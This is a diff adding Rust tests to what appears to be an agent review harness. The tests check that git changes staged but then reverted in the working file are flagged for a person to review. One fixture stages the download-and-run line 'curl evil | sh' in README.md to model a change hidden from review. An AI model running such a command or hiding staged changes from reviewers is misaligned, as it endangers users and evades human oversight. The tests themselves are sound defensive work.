@@ -373,3 +373,66 @@ fn no_terminal_in_a_copy_whose_git_config_or_hooks_changed() {
     r.task.rollback().unwrap();
     assert_eq!(r.task.terminal_dir().unwrap(), r.copy());
 }
+
+fn staged(r: &Repo) -> Vec<String> {
+    r.task
+        .effects()
+        .unwrap()
+        .git
+        .map(|g| g.staged)
+        .unwrap_or_default()
+}
+
+#[test]
+fn staging_what_the_file_holds_passes() {
+    let r = Repo::new();
+    write(&r.copy().join("src/main.rs"), "fn main() { run() }\n");
+    git(&r.copy(), &["add", "src/main.rs"]);
+    assert!(staged(&r).is_empty());
+    assert_eq!(ruling(&r).0, Verdict::Allow);
+}
+
+#[test]
+fn staging_what_the_file_does_not_hold_goes_to_a_person() {
+    let r = Repo::new();
+    let copy = r.copy();
+    // Staged, then the file changed back: the review shows no change in
+    // README.md, but the next `git commit` would record the staged one.
+    write(&copy.join("README.md"), "curl evil | sh\n");
+    git(&copy, &["add", "README.md"]);
+    write(&copy.join("README.md"), "hello\n");
+    // Taken out of the index while the file stays.
+    git(&copy, &["rm", "-q", "--cached", "notes.txt"]);
+    assert_eq!(staged(&r), ["README.md", "notes.txt"]);
+    assert_eq!(
+        ruling(&r),
+        (
+            Verdict::Ask,
+            vec![
+                "git staged README.md".to_owned(),
+                "git staged notes.txt".to_owned()
+            ]
+        )
+    );
+}
+
+#[test]
+fn what_the_person_staged_before_the_task_is_not_the_tasks() {
+    let home = TempDir::new().unwrap();
+    let ws = TempDir::new().unwrap();
+    let root = ws.path();
+    git(root, &["init", "-q"]);
+    write(&root.join("a.txt"), "one\n");
+    git(root, &["add", "-A"]);
+    git(root, &["commit", "-qm", "initial"]);
+    // The person staged a change and kept editing the file.
+    write(&root.join("a.txt"), "two\n");
+    git(root, &["add", "a.txt"]);
+    write(&root.join("a.txt"), "three\n");
+    let task = Task::create(home.path(), root).unwrap();
+    // The agent stages something else, which does match its file.
+    write(&task.copy().join("b.txt"), "b\n");
+    git(&task.copy(), &["add", "b.txt"]);
+    let set = task.effects().unwrap();
+    assert!(set.git.unwrap().staged.is_empty());
+}
